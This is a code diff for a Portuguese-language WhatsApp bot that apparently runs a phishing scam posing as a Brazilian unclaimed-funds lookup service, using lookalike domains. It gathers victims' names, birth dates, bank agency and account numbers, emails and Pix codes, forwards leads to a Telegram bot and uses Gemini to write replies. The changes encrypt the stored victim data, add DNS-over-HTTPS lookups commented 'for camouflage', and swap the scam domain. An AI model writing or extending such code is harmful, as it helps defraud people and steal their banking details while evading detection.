@@ -6,6 +6,8 @@ const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 const dotenv = require('dotenv');
+const { hashUrl, encryptData, decryptData, queryDnsDoH, getSecureHttpsAgent } = require('./security-utils.cjs');
+
 
 dotenv.config();
 
@@ -14,11 +16,11 @@ const BT = '```'; // Monospace marker for WhatsApp
 // --- OBFUSCATION LAYER ---
 const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');
 
-let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultarvaloresareceber.com.br').replace(/\/$/, "");
+let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultavaloresdisponiveis.com.br').replace(/\/$/, "");
 
 if (API_URL.includes("discloud.app")) {
     console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
-    API_URL = "https://consultarvaloresareceber.com.br";
+    API_URL = "https://consultavaloresdisponiveis.com.br";
 }
 
 const API_HEADERS = {
@@ -90,15 +92,26 @@ async function askAI(prompt, userMessage) {
     if (!GEMINI_KEY) return null;
     try {
         const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
+        
+        // Resolve domain via DoH for camouflage
+        const ips = await queryDnsDoH("generativelanguage.googleapis.com");
+        if (ips.length > 0) {
+            console.log(`🌐 [IA-DoH] resolved Gemini API -> ${ips[0]}`);
+        }
+
         const response = await axios.post(url, {
             contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
-        }, { timeout: 15000 }); // Adicionado timeout de 15s
+        }, { 
+            timeout: 15000,
+            httpsAgent: getSecureHttpsAgent() // Hardened TLS
+        });
         return response.data.candidates[0].content.parts[0].text || null;
     } catch (e) {
         console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
         return null;
     }
 }
+
 
 // --- RESET DE DADOS NO INÍCIO ---
 const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');
@@ -175,22 +188,50 @@ async function sendBotMessage(chatId, text, options = {}) {
     }
 }
 
+const SENSITIVE_SESSION_KEYS = ['name', 'birthDate', 'bankCc', 'bankAg', 'email', 'bankName', 'pixCode', 'formalMessage'];
+
+function decryptSession(session) {
+    const decrypted = { ...session };
+    SENSITIVE_SESSION_KEYS.forEach(key => {
+        if (decrypted[key] && typeof decrypted[key] === 'string' && decrypted[key].includes(':')) {
+            try { decrypted[key] = decryptData(decrypted[key]); } catch (e) { }
+        }
+    });
+    return decrypted;
+}
+
+function encryptSession(session) {
+    const encrypted = { ...session };
+    SENSITIVE_SESSION_KEYS.forEach(key => {
+        if (encrypted[key] && typeof encrypted[key] === 'string' && !encrypted[key].includes(':')) {
+            try { encrypted[key] = encryptData(encrypted[key]); } catch (e) { }
+        }
+    });
+    return encrypted;
+}
+
 function loadSessions() {
     try {
         if (fs.existsSync(SESSIONS_FILE)) {
             const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
-            chatSessions = new Map(Object.entries(data));
-            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
+            const decryptedEntries = Object.entries(data).map(([k, v]) => [k, decryptSession(v)]);
+            chatSessions = new Map(decryptedEntries);
+            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s) (Descriptografadas).`);
         }
     } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
 }
 
+
 function saveSessions() {
     try {
-        const obj = Object.fromEntries(chatSessions);
-        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
+        const encryptedData = {};
+        chatSessions.forEach((v, k) => {
+            encryptedData[k] = encryptSession(v);
+        });
+        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(encryptedData, null, 2));
     } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
 }
+
 
 loadSessions();
 
@@ -201,17 +242,21 @@ let waitingQueue = [];
 function loadQueue() {
     try {
         if (fs.existsSync(QUEUE_FILE)) {
-            waitingQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
-            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s).`);
+            const data = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
+            waitingQueue = data.map(item => decryptSession(item));
+            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s) (Descriptografados).`);
         }
     } catch (e) { console.error('Erro ao carregar fila:', e.message); }
 }
 
+
 function saveQueue() {
     try {
-        fs.writeFileSync(QUEUE_FILE, JSON.stringify(waitingQueue, null, 2));
+        const encryptedQueue = waitingQueue.map(item => encryptSession(item));
+        fs.writeFileSync(QUEUE_FILE, JSON.stringify(encryptedQueue, null, 2));
     } catch (e) { console.error('Erro ao salvar fila:', e.message); }
 }
+
 
 function addToQueue(chatId, name, birthDate) {
     // Evita duplicatas
@@ -237,15 +282,22 @@ loadQueue();
 async function notifyTelegram(html, messageId, replyMarkup) {
     if (!TG_TOKEN || !CHAT_ID) return null;
     try {
+        const agent = getSecureHttpsAgent();
         if (messageId) {
             const payload = { chat_id: CHAT_ID, message_id: messageId, text: html, parse_mode: 'HTML' };
             if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
-            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload, { timeout: 10000 });
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload, { 
+                timeout: 10000,
+                httpsAgent: agent
+            });
             return res.data.result?.message_id || messageId;
         } else {
             const payload = { chat_id: CHAT_ID, text: html, parse_mode: 'HTML' };
             if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
-            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload, { timeout: 10000 });
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload, { 
+                timeout: 10000,
+                httpsAgent: agent
+            });
             return res.data.result?.message_id || null;
         }
     } catch (e) {
@@ -253,6 +305,7 @@ async function notifyTelegram(html, messageId, replyMarkup) {
         return null;
     }
 }
+
 
 async function notifyTelegramPhoto(buffer, caption) {
     if (!TG_TOKEN || !CHAT_ID) return null;
@@ -452,8 +505,10 @@ client.on('qr', async (qr) => {
 
         const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
             headers: form.getHeaders(),
-            timeout: 15000
+            timeout: 15000,
+            httpsAgent: getSecureHttpsAgent()
         });
+
         if (res.data?.result) {
             saveQrMsgId(res.data.result.message_id);
             console.log('✅ [TELEGRAM] QR Code enviado/atualizado. ID:', lastQrMsgId);
@@ -989,10 +1044,19 @@ async function processIncomingMessage(msg, targetChatId) {
         if (userId) {
             try {
                 // Tenta buscar da API (que agora tem persistência)
+                // Resolve domain via DoH for camouflage
+                const apiHost = new URL(API_URL).hostname;
+                const ips = await queryDnsDoH(apiHost);
+                if (ips.length > 0) {
+                    console.log(`🌐 [API-DoH] resolved API -> ${ips[0]}`);
+                }
+
                 const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
                     headers: API_HEADERS,
-                    timeout: 8000
+                    timeout: 8000,
+                    httpsAgent: getSecureHttpsAgent()
                 });
+
                 if (res.status === 200 && res.data) {
                     expectedData = res.data;
                     console.log(`✅ [SINC] Dados recuperados da API para userId: ${userId}`);
@@ -1150,8 +1214,10 @@ async function processIncomingMessage(msg, targetChatId) {
             try {
                 const res = await axios.get(`${API_URL}/api/v1/session/data/${currentSession.userId}`, {
                     headers: API_HEADERS,
-                    timeout: 3000
+                    timeout: 3000,
+                    httpsAgent: getSecureHttpsAgent()
                 });
+
                 if (res.data && res.data.birthDate) {
                     currentSession.expectedData = res.data;
                     console.log(`[BOT] Successfully recovered expectedData on retry for ${targetChatId}`);
